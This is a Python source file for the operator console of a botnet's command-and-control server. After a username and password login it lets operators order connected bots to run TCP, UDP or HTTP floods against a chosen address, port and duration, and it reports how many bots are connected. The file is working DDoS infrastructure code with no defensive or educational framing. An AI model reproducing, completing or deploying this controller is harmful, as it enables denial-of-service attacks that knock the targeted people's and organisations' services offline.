from .base import *
from .validator import *

CNCUsage = '\r\n'
CNCUsage += 'Methods:\r\n'
CNCUsage += '   tcp     <addr> <port> <duration>\r\n'
CNCUsage += '   udp     <addr> <port> <duration>\r\n'
CNCUsage += '   http    <addr> <port> <duration>\r\n'
CNCUsage += 'Others:\r\n'
CNCUsage += '   bots    Show amount of bots\r\n'
CNCUsage += '\r\n'

class CNCHandler(HandlerSocket):

    def __init__(self, sock: socket, sockAddr: tuple) -> None:
        super().__init__(sock, sockAddr)
    
    def auth(self) -> bool:
        self.send('Login: ')
        username = self.recv().strip()

        self.send('Password: ')
        password = self.recv().strip()

        for user in USERS:
            if user[0] == username and user[1] == password:
                return True

    def handler(self) -> None:
        self.setLoginTimeout()

        if not self.auth():
            return self.close()
        
        self.setIdleTimeout()
        self.clearTerminal()
        self.sendRaw(BANNER)
        
        while 1:
            try:
                self.sendRaw(PROMPT)
                
                args = self.recv().split()
                size = len(args)

                if not args:
                    continue

                cmd = args[0]
                if cmd == '?' or cmd == 'help':
                    self.send(CNCUsage)
                elif cmd == 'cls' or cmd == 'clear':
                    self.clearTerminal()
                elif (cmd == 'tcp' or cmd == 'udp' or cmd == 'http') and size == 4:
                    addr = args[1]
                    port = isPort(args[2])
                    duration = isValidDuration(args[3])

                    if not (addr and port and duration):
                        continue

                    BOTManager.command(f'{cmd}|{addr}|{port}|{duration}')
                    self.send('Successfully sent command to bots!\r\n')
                elif cmd == 'bots':
                    self.send(f'{len(BOTManager.getBots())}\r\n')

            except Exception:
                break

        self.close()

class CNCServer(ServerSocket):

    def __init__(self, addr: str, port: int) -> None:
        super().__init__(addr, port, CNCHandler)